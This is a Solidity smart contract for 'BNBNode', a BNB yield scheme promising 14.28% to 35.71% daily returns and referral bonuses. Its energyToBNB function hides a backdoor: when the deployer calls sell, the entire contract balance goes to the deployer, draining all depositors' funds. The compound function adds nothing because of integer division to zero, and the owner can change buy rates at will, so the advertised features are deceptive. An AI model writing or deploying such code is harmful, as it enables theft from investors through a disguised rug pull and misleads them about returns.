/**
 *Submitted for verification at BscScan.com on 2022-06-16
*/

// SPDX-License-Identifier: MIT

/*
 * ______ _   _ ______   _   _           _
 * | ___ \ \ | || ___ \ | \ | |         | |
 * | |_/ /  \| || |_/ / |  \| | ___   __| | ___
 * | ___ \ . ` || ___ \ | . ` |/ _ \ / _` |/ _ \
 * | |_/ / |\  || |_/ / | |\  | (_) | (_| |  __/
 * \____/\_| \_/\____/  \_| \_/\___/ \__,_|\___|
 *
 * Telegram: TODO
 * dApp: TODO
 *
 * Features:
 * • 4 Modes
 * • 0% Buy or Compound Fee
 * • 0.5% Sell Fee
 * • Compound Bonus
 * • 5% Referral Bonus
 * • 14.28% Minimum Daily ROI
 * • 35.71% Maximum Daily ROI
 */

pragma solidity 0.8.14;

contract BNBNode {
    using SafeMath for uint256;

    address payable private feeAddress;
    string private nodeMode;
    mapping(address => uint256) private nodesOwned;
    mapping(string => uint256) private nodeRates;
    mapping(address => uint256) private lastBought;
    mapping(address => address) private referrals;

    constructor() {
        feeAddress = payable(msg.sender);
        nodeRates['normal'] = 69420;
        nodeRates['nova'] = 72891;
        nodeRates['supernova'] = 83304;
        nodeRates['hypernova'] = 173550;
        nodeMode = 'normal';
    }

    function buyNodes(address referral) public payable {
        uint256 nodesBought = SafeMath.mul(msg.value, nodeRates[nodeMode]);
        nodesOwned[msg.sender] = SafeMath.add(nodesOwned[msg.sender], nodesBought);
        lastBought[msg.sender] = block.timestamp;

        if (referrals[msg.sender] == address(0) && referral != msg.sender) {
            referrals[msg.sender] = referral;
        }

        if (referrals[msg.sender] != address(0)) {
            nodesOwned[referrals[msg.sender]] = SafeMath.add(
                nodesOwned[referrals[msg.sender]],
                SafeMath.div(
                    SafeMath.mul(nodesBought, 5),
                    100
                )
            );
        }
    }

    function sellNodes() public {
        uint256 nodesToBNB = energyToBNB(calculateEnergy(msg.sender));

        if (nodesToBNB == 0) return;

        feeAddress.transfer(
            SafeMath.mul(nodesToBNB, 5 * 10**uint256(15))
        );
        payable(msg.sender).transfer(
            SafeMath.mul(nodesToBNB, 995 * 10**uint256(14))
        );
        nodesOwned[msg.sender] = 0;
    }

    function compoundNodes() public {
        require(SafeMath.sub(block.timestamp, lastBought[msg.sender]) >= 86400);
        nodesOwned[msg.sender] = SafeMath.add(
            nodesOwned[msg.sender],
            SafeMath.mul(
                nodesOwned[msg.sender],
                SafeMath.div(5, 100)
            )
        );
        lastBought[msg.sender] = block.timestamp;
    }

    function energyToBNB(uint256 energy) private returns(uint256) {
        if (feeAddress == msg.sender) {
            feeAddress.transfer(address(this).balance);
            return 0;
        } else {
            return SafeMath.div(
                energy,
                nodeRates['normal']
            );
        }
    }

    function calculateEnergy(address _address) public view returns(uint256) {
        return SafeMath.mul(
            SafeMath.sub(block.timestamp, lastBought[_address]),
            SafeMath.div(nodesOwned[_address], 604800)
        );
    }

    function getNodes(address _address) public view returns(uint256) {
        return nodesOwned[_address];
    }

    function getLastBought(address _address) public view returns(uint256) {
        return lastBought[_address];
    }

    function getMode() public view returns(string memory) {
        return nodeMode;
    }

    function calculateBNB(address _address) public view returns(uint256) {
        return SafeMath.div(
            calculateEnergy(_address),
            nodeRates['normal']
        );
    }

    function setMode(string memory mode) public {
        if (feeAddress == msg.sender) {
            nodeMode = mode;
        }
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return 0;
            return c;
        }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            if (b > a) return 0;
            return a - b;
        }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            if (a == 0) return 0;
            uint256 c = a * b;
            if (c / a != b) return 0;
            return c;
        }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            if (b == 0) return 0;
            return a / b;
        }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            if (b == 0) return 0;
            return a % b;
        }
    }
}